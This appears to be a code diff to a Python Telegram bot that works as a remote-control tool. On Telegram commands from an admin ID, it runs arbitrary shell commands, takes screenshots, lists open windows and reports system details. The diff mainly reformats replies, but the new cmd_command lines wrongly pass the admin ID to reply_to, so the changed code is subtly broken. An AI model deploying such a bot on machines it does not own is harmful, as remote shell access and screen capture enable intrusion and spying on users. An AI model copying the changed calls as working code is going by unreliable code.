@@ -112,7 +112,7 @@ class Core:
     def help_command(self, message):
         if message.from_user.id != self.ADMIN_ID:
             return
-        self.bot.reply_to(message, self.text)
+        self.bot.send_message(self.ADMIN_ID, self.text)
 
     def cmd_command(self, message):
         import subprocess
@@ -129,10 +129,9 @@ class Core:
     text=True, encoding='cp866',)
         stdout, stderr = process.communicate()
         if stderr:
-            print(f"Обнаружена ошибка: {stderr}")
-        else:
-            print("Ошибок нет.")
-        self.bot.reply_to(message, f"Команда выполнена: {cmd}")
+            self.bot.reply_to(self.ADMIN_ID, f"Ошибка: {cmd}\n`{stderr}`", parse_mode="Markdown")
+            return
+        self.bot.reply_to(self.ADMIN_ID, f"Команда выполнена: {cmd}\n`{stdout}`", parse_mode="Markdown")
 
     def screenshot_command(self, message):
         import pyautogui
@@ -351,9 +350,9 @@ class Core:
         import psutil
         import platform
 
-        self.bot.reply_to(message, f"{platform.system()}\n{platform.node()}\n{platform.platform()}\n{platform.machine()}\n"
-                              f"{platform.python_build()}\n{platform.python_compiler()}\n{platform.processor()}\n"
-                              f"{platform.python_version()}\n{psutil.cpu_count()}\n{psutil.virtual_memory()}")
+        self.bot.reply_to(message, f"OS: `{platform.platform()}`\nName: `{platform.node()}`\nArch: `{platform.machine()}`\nProcessor: `{platform.processor()}`\n\n"
+                              f"Python build: `{platform.python_build()}`\nCompiler: `{platform.python_compiler()}`\n"
+                              f"Python version: `{platform.python_version()}`\n\nCPU count: `{psutil.cpu_count()}`\nMemory: `{psutil.virtual_memory()}`", parse_mode="Markdown")
 
     def list_all_windows(self, message):
         if message.from_user.id != self.ADMIN_ID:
@@ -479,6 +478,6 @@ class Core:
         self.bot.polling(none_stop=True)
 
 if __name__ == '__main__':
-    TOKEN = "your token"
+    TOKEN = "yourtoken"
     app = Core(TOKEN)
     app.run()
